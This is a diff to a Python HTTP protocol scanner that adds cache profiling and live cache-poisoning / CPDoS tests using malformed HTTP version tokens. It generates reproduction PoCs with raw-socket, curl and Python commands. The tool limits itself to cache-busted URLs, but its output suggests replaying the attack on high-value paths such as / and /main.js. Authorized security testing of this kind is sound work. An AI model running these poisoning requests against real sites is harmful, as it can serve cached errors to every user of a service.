@@ -3,8 +3,9 @@
 HTTP Version & Protocol Analyzer
 ---------------------------------
 Tests support for different HTTP versions on a target, detects
-misconfigurations (HTTP/0.9, pipeline injection, desync, open proxy)
-and analyzes sensitive content leaks.
+misconfigurations (HTTP/0.9, pipeline injection, desync, open proxy),
+analyzes sensitive content leaks, and probes cache poisoning /
+CPDoS through unhandled or error-triggering HTTP version tokens.
 """
 
 from __future__ import annotations
@@ -13,6 +14,7 @@ import gzip
 import hashlib
 import socket
 import ssl
+import uuid
 import zlib
 from typing import Any
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -41,10 +43,10 @@ VALID_HTTP_VERSIONS = {"HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"}
 
 # Versions to test (standard + malformed)
 TEST_VERSIONS = [
-    "HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3",
+    "/", "HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3",
     "QUIC", "SHTTP/1.3",
     "HTTP/1.2", "HTTP/1.6", "HTTP/4.0", "HTTP/99.9", "HTTP/1.1.1",
-    "HtTP/1.1", "INVALID/1.1", "", " HTTP/1.1", "HTTP/1.1 ",
+    "HtTP/1.1", "INVALID/1.1", "", " HTTP/1.1", "HTTP/1.1 ", "HTTP/777"
 ]
 
 # Critical leak signatures only
@@ -76,6 +78,30 @@ ERROR_SIGNATURES = [
     b"invalid request",
 ]
 
+# ── CP / CPDoS settings ──────────────────────────────────────
+
+CACHE_HEADERS = (
+    "x-cache", "x-cache-status", "x-cache-hits", "x-cache-lookup",
+    "cf-cache-status", "cache-status", "x-varnish", "x-served-by",
+    "x-proxy-cache", "x-fastly-cache", "x-akamai-cache", "x-cdn-cache",
+    "cdn-cache", "x-drupal-cache", "x-litespeed-cache", "x-rack-cache",
+    "x-nc", "x-iinfo", "x-hs-cf-cache-status", "x-vercel-cache",
+    "x-nextjs-cache", "x-sucuri-cache", "x-cacheable", "x-cache-remote",
+    "fastly-debug-digest", "x-timer",
+)
+
+HIT_RE = re.compile(r"\b(hit|stale|revalidated|updating)\b", re.I)
+MISS_RE = re.compile(r"\b(miss|expired|bypass|dynamic|pass|none|uncached)\b", re.I)
+
+CB_PARAM = "cb"
+
+# Delay between the poisoning request and the victim request
+CPDOS_SETTLE = 0.4
+
+# Max distinct version behaviours tested for CPDoS
+CPDOS_MAX_CANDIDATES = 8
+CPDOS_WORKERS = 3
+
 
 # ─────────────────────────────────────────────────────────────
 # Data classes
@@ -105,6 +131,10 @@ class ParsedURL:
     def is_https(self) -> bool:
         return self.scheme == "https"
 
+    @property
+    def base(self) -> str:
+        return f"{self.scheme}://{self.host}:{self.port}"
+
 
 @dataclass
 class VersionProbeResult:
@@ -130,6 +160,60 @@ class VulnTestResult:
     response_preview: str = ""
     poc: list[str] = field(default_factory=list)
     content_leaks: list[str] = field(default_factory=list)
+
+
+@dataclass
+class CacheProbe:
+    """Single response captured for cache analysis."""
+
+    code: int | None = None
+    size: int = 0
+    headers: dict[str, str] = field(default_factory=dict)
+    body_hash: str = ""
+    body_preview: str = ""
+    first_line: str = ""
+    cache_state: str = "NONE"
+    cache_indicator: str = ""
+    age: int | None = None
+    error: str = ""
+
+    @property
+    def ok(self) -> bool:
+        return self.code is not None or self.size > 0
+
+
+@dataclass
+class CacheProfile:
+    """Cache behaviour of the target on cache-busted URLs."""
+
+    cacheable: str = "no"            # yes / maybe / no
+    key_includes_query: bool = True
+    indicator: str = ""
+    baseline_code: int | None = None
+    baseline_hash: str = ""
+    baseline_size: int = 0
+    note: str = ""
+
+
+@dataclass
+class CPDoSResult:
+    """Result of a version-based CP / CPDoS test."""
+
+    version: str
+    equivalents: list[str] = field(default_factory=list)
+    error_triggered: bool = False
+    error_desc: str = ""
+    vulnerable: bool = False
+    kind: str = ""                   # CPDoS / CP
+    confidence: int = 0
+    reason: str = ""
+    attack_code: int | None = None
+    victim_code: int | None = None
+    baseline_code: int | None = None
+    cache_indicator: str = ""
+    reflected: bool = False
+    url: str = ""
+    poc: list[str] = field(default_factory=list)
 
 
 # ─────────────────────────────────────────────────────────────
@@ -228,24 +312,39 @@ def parse_status_line(raw: bytes) -> tuple[str, int | None]:
         return raw[:80].decode(errors="replace"), None
 
 
-def extract_server_header(raw: bytes) -> str:
-    """Extracts the Server header value from a raw HTTP response."""
+def parse_headers(raw: bytes) -> dict[str, str]:
+    """Parses response headers into a lowercase dict.
+
+    Duplicate headers are joined with ', ' so that multi-valued
+    cache headers (Cache-Status, X-Cache) stay analyzable.
+    """
     header_end = raw.find(b"\r\n\r\n")
     if header_end == -1:
-        return ""
+        return {}
 
     try:
         header_text = raw[:header_end].decode("utf-8", errors="ignore")
     except Exception:
-        return ""
+        return {}
 
+    headers: dict[str, str] = {}
     for line in header_text.split("\r\n")[1:]:
-        if ":" in line:
-            key, value = line.split(":", 1)
-            if key.strip().lower() == "server":
-                return value.strip()
+        if ":" not in line:
+            continue
+        key, value = line.split(":", 1)
+        key = key.strip().lower()
+        value = value.strip()
+        if key in headers:
+            headers[key] = f"{headers[key]}, {value}"
+        else:
+            headers[key] = value
 
-    return ""
+    return headers
+
+
+def extract_server_header(raw: bytes) -> str:
+    """Extracts the Server header value from a raw HTTP response."""
+    return parse_headers(raw).get("server", "")
 
 
 def decompress_body(raw: bytes) -> bytes:
@@ -858,6 +957,484 @@ def _build_proxy_poc(target: ParsedURL) -> list[str]:
 
 
 # ─────────────────────────────────────────────────────────────
+# Cache helpers (CP / CPDoS)
+# ─────────────────────────────────────────────────────────────
+
+def make_cb() -> str:
+    """Generates a unique cache buster parameter."""
+    return f"{CB_PARAM}={uuid.uuid4().hex[:12]}"
+
+
+def path_with_cb(target: ParsedURL, cb: str) -> str:
+    """Appends a cache buster to the target path."""
+    sep = "&" if "?" in target.path else "?"
+    return f"{target.path}{sep}{cb}"
+
+
+def analyze_cache_headers(headers: dict[str, str]) -> tuple[str, str]:
+    """Determines the cache state from response headers.
+
+    Returns (state, indicator) where state is HIT / MISS / UNKNOWN / NONE.
+    All known cache headers are inspected: a HIT anywhere wins over a
+    MISS elsewhere (multi-layer CDN stacks report both).
+    """
+    fallback = ("NONE", "")
+
+    for name in CACHE_HEADERS:
+        value = headers.get(name)
+        if not value:
+            continue
+
+        if name == "x-cache-hits":
+            nums = [int(n) for n in re.findall(r"\d+", value)]
+            if nums and max(nums) > 0:
+                return "HIT", f"{name}: {value}"
+            fallback = ("MISS", f"{name}: {value}")
+            continue
+
+        if name == "x-varnish":
+            if len(re.findall(r"\d+", value)) >= 2:
+                return "HIT", f"{name}: {value}"
+            fallback = ("MISS", f"{name}: {value}")
+            continue
+
+        if HIT_RE.search(value):
+            return "HIT", f"{name}: {value}"
+        if MISS_RE.search(value):
+            fallback = ("MISS", f"{name}: {value}")
+            continue
+
+        if fallback[0] == "NONE":
+            fallback = ("UNKNOWN", f"{name}: {value}")
+
+    age = headers.get("age", "").strip()
+    if age.isdigit() and int(age) > 0:
+        return "HIT", f"age: {age}"
+
+    return fallback
+
+
+def send_probe(
+    target: ParsedURL,
+    path: str,
+    version: str = "HTTP/1.1",
+    *,
+    read_timeout: int = TIMEOUT_READ,
+) -> CacheProbe:
+    """Sends a request with an arbitrary version token and profiles the cache.
+
+    Accept-Encoding is forced to identity so body hashes stay comparable
+    between the poisoning request and the victim request.
+    """
+    probe = CacheProbe()
+
+    try:
+        version_str = f" {version}" if version else ""
+        raw_req = (
+            f"GET {path}{version_str}\r\n"
+            f"Host: {target.host}\r\n"
+            f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
+            f"Accept: */*\r\n"
+            f"Accept-Encoding: identity\r\n"
+            f"Connection: close\r\n\r\n"
+        ).encode()
+
+        sock = create_socket(target, force_h1=True, timeout=TIMEOUT_SOCKET)
+        resp = send_recv(sock, raw_req, read_timeout=read_timeout)
+        sock.close()
+
+        if not resp:
+            probe.error = "no_response"
+            return probe
+
+        resp = decompress_body(resp)
+        first_line, code = parse_status_line(resp)
+        headers = parse_headers(resp)
+        body = get_response_body(resp)
+
+        probe.code = code
+        probe.size = len(resp)
+        probe.headers = headers
+        probe.first_line = first_line
+        probe.body_hash = hashlib.md5(body).hexdigest()  # nosec B324
+        probe.body_preview = body[:600].decode(errors="replace")
+
+        state, indicator = analyze_cache_headers(headers)
+        probe.cache_state = state
+        probe.cache_indicator = indicator
+
+        age = headers.get("age", "").strip()
+        probe.age = int(age) if age.isdigit() else None
+
+    except Exception as e:
+        probe.error = e.__class__.__name__
+
+    return probe
+
+
+def profile_cache(target: ParsedURL) -> CacheProfile:
+    """Profiles caching behaviour on cache-busted URLs.
+
+    1. Two requests on the same cb URL -> is the resource cacheable?
+    2. One request on a fresh cb URL   -> is the query string part of
+       the cache key? (if not, poisoning would hit the real page,
+       so CP/CPDoS tests are aborted)
+    """
+    profile = CacheProfile()
+
+    cb1 = make_cb()
+    path1 = path_with_cb(target, cb1)
+
+    first = send_probe(target, path1)
+    time.sleep(CPDOS_SETTLE)
+    second = send_probe(target, path1)
+
+    cb2 = make_cb()
+    path2 = path_with_cb(target, cb2)
+    fresh = send_probe(target, path2)
+
+    profile.baseline_code = fresh.code
+    profile.baseline_hash = fresh.body_hash
+    profile.baseline_size = fresh.size
+    profile.indicator = second.cache_indicator or first.cache_indicator
+
+    age_growth = (
+        first.age is not None
+        and second.age is not None
+        and second.age > first.age
+    )
+
+    if second.cache_state == "HIT" or age_growth:
+        profile.cacheable = "yes"
+    elif second.cache_indicator or first.cache_indicator:
+        profile.cacheable = "maybe"
+        profile.note = "cache layer detected but no HIT observed"
+    else:
+        cc = second.headers.get("cache-control", "").lower()
+        if "public" in cc or re.search(r"max-age=[1-9]", cc):
+            profile.cacheable = "maybe"
+            profile.note = "cacheable Cache-Control but no cache header"
+        else:
+            profile.cacheable = "no"
+            profile.note = "no cache indicator found"
+
+    # Fresh cb URL answering HIT means the query string is stripped
+    # from the cache key -> unsafe to run poisoning tests
+    if fresh.cache_state == "HIT" and profile.cacheable != "no":
+        profile.key_includes_query = False
+        profile.note = "query string excluded from cache key"
+
+    return profile
+
+
+# ─────────────────────────────────────────────────────────────
+# CP / CPDoS via HTTP version tokens
+# ─────────────────────────────────────────────────────────────
+
+def select_cpdos_candidates(
+    results: list[VersionProbeResult],
+    max_candidates: int = CPDOS_MAX_CANDIDATES,
+) -> list[tuple[str, list[str]]]:
+    """Selects version tokens worth testing for CP / CPDoS.
+
+    Only unaccepted versions matter: tokens the server doesn't
+    understand, tokens returning an error, and tokens that get no
+    response at all. Versions sharing the same response signature
+    are grouped so the same behaviour isn't tested several times.
+    """
+    groups: dict[tuple[int | None, int], list[str]] = {}
+
+    for r in results:
+        if r.accepted:
+            continue
+        if r.first_line.startswith("ERR:") and r.code is None and r.size == 0:
+            signature = (None, -1)
+        else:
+            signature = (r.code, r.size // 128)
+        groups.setdefault(signature, []).append(r.version)
+
+    candidates: list[tuple[str, list[str]]] = []
+    for versions in groups.values():
+        candidates.append((versions[0], versions[1:]))
+
+    return candidates[:max_candidates]
+
+
+def classify_attack_error(
+    attack: CacheProbe, profile: CacheProfile
+) -> tuple[bool, str]:
+    """Decides whether the version token actually provoked an error.
+
+    This is the gate of the whole test: no error means there is
+    nothing worth caching, and the URL is dropped before any victim
+    request is sent.
+    """
+    if attack.error == "no_response" or (attack.code is None and attack.size == 0):
+        return True, "no response (connection dropped or reset)"
+
+    if attack.code is None:
+        return True, "malformed response (no HTTP status line)"
+
+    if attack.code >= 400:
+        return True, f"error status {attack.code}"
+
+    if profile.baseline_code is not None and attack.code != profile.baseline_code:
+        return True, (
+            f"status differs from baseline "
+            f"({profile.baseline_code} -> {attack.code})"
+        )
+
+    if has_error_signature(attack.body_preview.encode(errors="replace")):
+        return True, f"error page served with status {attack.code}"
+
+    return False, f"handled normally (status {attack.code})"
+
+
+def test_version_cpdos(
+    target: ParsedURL,
+    version: str,
+    equivalents: list[str],
+    profile: CacheProfile,
+) -> CPDoSResult:
+    """Tests whether an error caused by an HTTP version token gets cached.
+
+    Sequence on a fresh cache-busted URL:
+
+    1. Send the version token and check it PROVOKES AN ERROR.
+       If the server handles it normally, stop here -- nothing to cache.
+    2. Victim request (clean HTTP/1.1) on the SAME URL -> is the very
+       same error served back?
+    3. Second victim request -> persistence in the cache
+    4. Control request on a brand new cb URL -> rules out IP ban,
+       rate limiting or a WAF blocking the whole client
+
+    Verdict is CPDoS when the cached error is a 4xx/5xx (or no
+    response), CP when it is a non-error response differing from the
+    baseline (cached redirect, swapped body).
+    """
+    result = CPDoSResult(
+        version=version,
+        equivalents=equivalents,
+        baseline_code=profile.baseline_code,
+    )
+
+    cb = make_cb()
+    path = path_with_cb(target, cb)
+    result.url = f"{target.base}{path}"
+
+    # Step 1: does this version token trigger an error at all?
+    attack = send_probe(target, path, version, read_timeout=TIMEOUT_QUICK)
+    result.attack_code = attack.code
+
+    error_triggered, error_desc = classify_attack_error(attack, profile)
+    result.error_triggered = error_triggered
+    result.error_desc = error_desc
+
+    if not error_triggered:
+        result.reason = f"No error provoked -- {error_desc}"
+        return result
+
+    # Step 2: is that error stored in the cache?
+    time.sleep(CPDOS_SETTLE)
+    victim = send_probe(target, path)
+    result.victim_code = victim.code
+    result.cache_indicator = victim.cache_indicator
+
+    baseline_code = profile.baseline_code
+    baseline_hash = profile.baseline_hash
+
+    same_status = (
+        victim.code == attack.code
+        and victim.code != baseline_code
+    )
+    same_body = bool(
+        attack.body_hash
+        and victim.body_hash == attack.body_hash
+        and baseline_hash
+        and victim.body_hash != baseline_hash
+    )
+
+    if not (same_status or same_body):
+        result.reason = (
+            f"Error provoked ({error_desc}) but NOT cached "
+            f"(victim={victim.code}, baseline={baseline_code})"
+        )
+        return result
+
+    # Step 3: persistence
+    time.sleep(CPDOS_SETTLE)
+    victim2 = send_probe(target, path)
+    persistent = (
+        victim2.code == victim.code
+        and (not same_body or victim2.body_hash == victim.body_hash)
+    )
+
+    # Step 4: control on an untouched URL -> detects IP ban / rate limiting
+    control = send_probe(target, path_with_cb(target, make_cb()))
+    if control.code != baseline_code:
+        result.reason = (
+            f"False positive -- fresh URL also affected "
+            f"(control={control.code}); likely rate limiting / WAF ban"
+        )
+        return result
+
+    confidence = 40
+    if persistent:
+        confidence += 30
+    if victim.cache_state == "HIT" or (victim.age or 0) > 0:
+        confidence += 20
+    if profile.cacheable == "yes":
+        confidence += 10
+    confidence = min(confidence, 100)
+
+    token = version.strip()
+    if token and token.lower() in victim.body_preview.lower():
+        result.reflected = True
+
+    result.vulnerable = True
+    result.confidence = confidence
+    result.kind = (
+        "CPDoS" if (victim.code is None or victim.code >= 400) else "CP"
+    )
+    result.reason = (
+        f"Error cached and served to clean request -- {error_desc} "
+        f"(baseline={baseline_code} -> victim={victim.code})"
+    )
+
+    result.poc = _build_cpdos_poc(target, result, path, victim, attack)
+    return result
+
+
+def _build_cpdos_poc(
+    target: ParsedURL,
+    result: CPDoSResult,
+    path: str,
+    victim: CacheProbe,
+    attack: CacheProbe,
+) -> list[str]:
+    """Generates reproduction instructions for a version-based CP/CPDoS."""
+    version = result.version if result.version else "<empty>"
+    version_str = f" {result.version}" if result.version else ""
+    scheme = "https" if target.is_https else "http"
+    connect = _get_connect_cmd(target)
+    ssl_imp, ssl_lines = _get_python_socket_lines(target)
+    url = f"{scheme}://{target.host}{path}"
+
+    lines = [
+        f"{result.kind} via HTTP version token '{version}'",
+        "",
+        "Description:",
+        f"  The version token '{version}' provokes an error at the origin",
+        f"  ({result.error_desc}), and the cache in front stores that error",
+        "  under the plain URL cache key. Any later request from a",
+        "  legitimate user is served the cached error instead of the",
+        "  real resource.",
+        "",
+        "Impact:",
+    ]
+
+    if result.kind == "CPDoS":
+        lines += [
+            "  - Denial of service on the cached resource (error served to all)",
+            "  - Persistent until TTL expiry or manual purge",
+            "  - Amplifiable to critical assets (JS/CSS bundles, API endpoints)",
+        ]
+    else:
+        lines += [
+            "  - Attacker-influenced content served to other users",
+            "  - Potential stored XSS / content spoofing depending on body",
+            "  - Persistent until TTL expiry or manual purge",
+        ]
+
+    if result.reflected:
+        lines.append("  - Version token reflected in the cached body")
+
+    lines += [
+        "",
+        "Evidence:",
+        f"  Baseline (clean, fresh cb) : {result.baseline_code}",
+        f"  Error provoked             : {result.error_desc}",
+        f"  Poisoning request          : {result.attack_code}",
+        f"  Victim request (clean)     : {result.victim_code}",
+        f"  Cache indicator            : {victim.cache_indicator or 'n/a'}",
+        f"  Confidence                 : {result.confidence}%",
+        "",
+        "Reproduce (use a NEW cache buster each run):",
+        f"  $ CB=$(uuidgen | tr -d '-' | cut -c1-12)",
+        f"  $ URL='{scheme}://{target.host}{target.path}?{CB_PARAM}='$CB",
+        "",
+        "  1) Poison with the malformed version:",
+        f"  $ printf 'GET {target.path}?{CB_PARAM}='$CB'{version_str}\\r\\n"
+        f"Host: {target.host}\\r\\nConnection: close\\r\\n\\r\\n' | {connect}",
+        "",
+        "  2) Victim request (normal client):",
+        f"  $ curl -sk -o /dev/null -w '%{{http_code}} %{{size_download}}\\n' -D- \"$URL\" | grep -Ei 'HTTP/|x-cache|cf-cache|age:'",
+        "",
+        f"  Expected: {result.baseline_code} before poisoning, "
+        f"{result.victim_code} after.",
+        "",
+        "Reproduce with Python:",
+        f'  import socket{ssl_imp}, uuid, requests',
+        f'  cb = uuid.uuid4().hex[:12]',
+        f'  path = "{target.path}?{CB_PARAM}=" + cb',
+        f'  url = "{scheme}://{target.host}" + path',
+        f'  print("baseline:", requests.get(url + "-control", verify=False).status_code)',
+        f'  s = socket.create_connection(("{target.host}", {target.port}))',
+        *ssl_lines,
+        f'  s.sendall(f"GET {{path}}{version_str}\\r\\nHost: {target.host}\\r\\nConnection: close\\r\\n\\r\\n".encode())',
+        '  s.recv(65535); s.close()',
+        '  r = requests.get(url, verify=False)',
+        '  print("victim:", r.status_code, r.headers.get("X-Cache"), r.headers.get("Age"))',
+        "",
+        "Confirmed URL used during the scan:",
+        f"  {result.url}",
+        "",
+        "Next steps to raise severity:",
+        "  - Replay against high-value paths (/, /main.js, /api/*) on a",
+        "    disposable cache buster first, then assess real-key impact",
+        "  - Check whether the poisoned entry survives across edge nodes",
+        "    (resolve several PoPs / use --resolve)",
+        "  - Measure TTL via the Age header to document persistence",
+    ]
+
+    if attack.first_line:
+        lines += ["", f"Poisoning response status line: {attack.first_line[:120]}"]
+
+    return lines
+
+
+def run_cpdos_suite(
+    target: ParsedURL,
+    probe_results: list[VersionProbeResult],
+    profile: CacheProfile,
+) -> list[CPDoSResult]:
+    """Runs the CP / CPDoS tests on all candidate version tokens."""
+    candidates = select_cpdos_candidates(probe_results)
+    if not candidates:
+        return []
+
+    results: list[CPDoSResult] = []
+
+    with ThreadPoolExecutor(max_workers=CPDOS_WORKERS) as pool:
+        futures = {
+            pool.submit(test_version_cpdos, target, version, equivalents, profile): version
+            for version, equivalents in candidates
+        }
+        for future in as_completed(futures):
+            try:
+                results.append(future.result())
+            except Exception as e:
+                results.append(CPDoSResult(
+                    version=futures[future],
+                    reason=f"Error: {e.__class__.__name__}",
+                ))
+
+    order = {v: i for i, (v, _) in enumerate(candidates)}
+    results.sort(key=lambda r: order.get(r.version, 999))
+    return results
+
+
+# ─────────────────────────────────────────────────────────────
 # Content leak analysis
 # ─────────────────────────────────────────────────────────────
 
@@ -1027,6 +1604,43 @@ def print_vuln_result(vr: VulnTestResult) -> None:
             print(f"         \u2514\u2500 {Colors.RED}LEAK DETECTED:{Colors.RESET} {leak}")
 
 
+def print_cpdos_result(cr: CPDoSResult) -> None:
+    """Displays a confirmed version-based CP / CPDoS finding."""
+    version = cr.version if cr.version else "<empty>"
+    equiv = f" (+{len(cr.equivalents)} equivalent)" if cr.equivalents else ""
+
+    if cr.confidence >= 90:
+        conf_color = Colors.GREEN
+    elif cr.confidence >= 60:
+        conf_color = Colors.YELLOW
+    else:
+        conf_color = Colors.RED
+
+    status = f"{Colors.RED}{cr.kind} VULNERABLE{Colors.RESET}"
+    conf_str = f" [{conf_color}{cr.confidence}%{Colors.RESET}]"
+
+    print(f"       - {version:<15}{equiv}: {status}{conf_str}")
+    print(f"         \u2514\u2500 {cr.reason}")
+    print(
+        f"         \u2514\u2500 codes: baseline={cr.baseline_code} "
+        f"attack={cr.attack_code} victim={cr.victim_code}"
+    )
+
+    if cr.cache_indicator:
+        print(f"         \u2514\u2500 cache: {cr.cache_indicator}")
+
+    if cr.reflected:
+        print(
+            f"         \u2514\u2500 {Colors.YELLOW}Version token reflected "
+            f"in cached body{Colors.RESET}"
+        )
+
+    if cr.poc:
+        print(f"         \u2514\u2500 {Colors.CYAN}PoC / Reproduction:{Colors.RESET}")
+        for line in cr.poc:
+            print(f"         \u2502   {line}")
+
+
 # ─────────────────────────────────────────────────────────────
 # Main entry point
 # ─────────────────────────────────────────────────────────────
@@ -1039,6 +1653,7 @@ def check_http_version(url: str) -> None:
     3. HTTP/0.9 probe + vulnerability tests if supported
     4. Probe all versions (standard + malformed) in parallel
     5. Display accepted/rejected versions with anomaly flags
+    6. Cache profiling + CP/CPDoS tests on unhandled/error versions
     """
     print(f"{Colors.CYAN} \u251c Version & protocol analysis{Colors.RESET}")
 
@@ -1101,3 +1716,39 @@ def check_http_version(url: str) -> None:
 
     if rejected:
         print_version_table("Rejected/Error versions", rejected[:10])
+
+    # 5. CP / CPDoS via unhandled or error-returning versions
+    # Runs silently: nothing is printed unless a finding is confirmed
+    try:
+        profile = profile_cache(target)
+
+        # Abort silently if the cache key ignores the query string
+        # (testing would poison the real resource) or if no usable
+        # baseline could be established on the cache-busted URL
+        if not profile.key_includes_query or profile.baseline_code is None:
+            logger.debug(
+                "CP/CPDoS skipped (key_includes_query=%s, baseline=%s)",
+                profile.key_includes_query, profile.baseline_code,
+            )
+            return
+
+        cpdos_results = run_cpdos_suite(target, weirds, profile)
+        vulnerable = [c for c in cpdos_results if c.vulnerable]
+
+        logger.debug(
+            "CP/CPDoS: %d behaviour(s) tested, %d error(s), %d cached",
+            len(cpdos_results),
+            len([c for c in cpdos_results if c.error_triggered]),
+            len(vulnerable),
+        )
+
+        if vulnerable:
+            print(
+                f"\n \u251c\u2500\u2500 HTTP versions analysis"
+                f"({len(vulnerable)}):"
+            )
+            for cr in vulnerable:
+                print_cpdos_result(cr)
+
+    except Exception:
+        logger.exception("CP/CPDoS testing error")
